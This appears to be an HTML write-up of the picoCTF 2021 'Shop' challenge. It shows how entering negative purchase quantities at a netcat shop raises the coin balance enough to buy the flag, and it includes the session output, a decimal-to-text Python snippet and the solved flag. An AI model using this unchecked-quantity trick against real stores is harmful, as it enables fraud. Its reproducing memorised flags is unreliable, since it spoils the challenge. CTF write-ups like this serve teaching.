<title>Shop-  picoctf2021</title>

<!DOCTYPE html>
<html>

<body>
    <h1>Shop-  picoctf2021</h1>

    <h2>Challenge Description</h2>
    <p> AUTHOR: THELSHELL

Description
Best Stuff - Cheap Stuff, Buy Buy Buy... Store Instance: source. The shop is open for business at nc mercury.picoctf.net 42159.
</p>
merge
    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
    <ol>
        we run nc and see that count  of items have no control on negative values so can choice -items and and increase coins of our wallet and buy flag with this options
    <p id="code1">
How many do you want to buy?
-2
You have 60 coins
        Item            Price   Count
(0) Quiet Quiches       10      14
(1) Average Apple       15      8
(2) Fruitful Flag       100     1
(3) Sell an Item
(4) Exit
Choose an option: 
0
How many do you want to buy?
-4
You have 100 coins
        Item            Price   Count
(0) Quiet Quiches       10      18
(1) Average Apple       15      8
(2) Fruitful Flag       100     1
(3) Sell an Item
(4) Exit
Choose an option: 
2
How many do you want to buy?
1
Flag is:  [112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 55 57 55 98 50 57 50 99 125]
)
</p>
<pre>s="112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 55 57 55 98 50 57 50 99 125"
d=""
for ch in s.split():
  d+=chr(int(ch))
print(d)
</pre>
    </ol> 
<br>
 
    <h2>Flag</h2>
    <p class="flag">picoCTF{b4d_brogrammer_797b292c}

</p>

    <h2>Conclusion</h2>
    <p>this is a very   easy chanllenge for  hack sample network shop and convert decimal arrays value to string</p>
</body>
</html>

